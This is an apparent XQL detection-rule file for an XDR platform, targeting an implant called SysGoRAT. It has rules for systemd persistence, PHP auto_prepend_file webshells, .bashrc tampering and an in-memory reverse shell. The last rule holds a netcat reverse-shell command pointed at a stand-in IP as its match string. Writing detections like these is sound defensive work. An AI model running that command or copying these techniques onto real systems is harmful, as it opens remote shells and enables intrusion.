# TTP-2026-0184 — SysGoRAT Implant with systemd Persistence and In-Memory Shell
# XQL paste-buffer generated by detection_scanner/scripts/export_artifacts.py

## BIOC — Systemd Service Creation
# severity: high
# Detection of new systemd service file creation

dataset = xdr_data
| filter event_type = ENUM.FILE and event_sub_type = ENUM.FILE_CREATE
| filter action_file_path = '/etc/systemd/system/sys-update.service'
| filter actor_process_image_name = 'systemd'

## BIOC — PHP Webshell Injection
# severity: high
# Detection of PHP auto_prepend_file usage

dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'php'
| filter actor_process_image_name = 'php'
| filter action_process_cmdline contains 'auto_prepend_file'

## BIOC — Bashrc Credential Theft
# severity: medium
# Detection of .bashrc modification by www-data

dataset = xdr_data
| filter event_type = ENUM.FILE and event_sub_type = ENUM.FILE_MODIFY
| filter action_file_path = '/home/www-data/.bashrc'
| filter actor_process_image_name = 'bash'

## BIOC — In-Memory Reverse Shell
# severity: high
# Detection of in-memory shell execution

dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'bash'
| filter action_process_cmdline contains 'nc -e /bin/bash 192.0.2.100 4444'

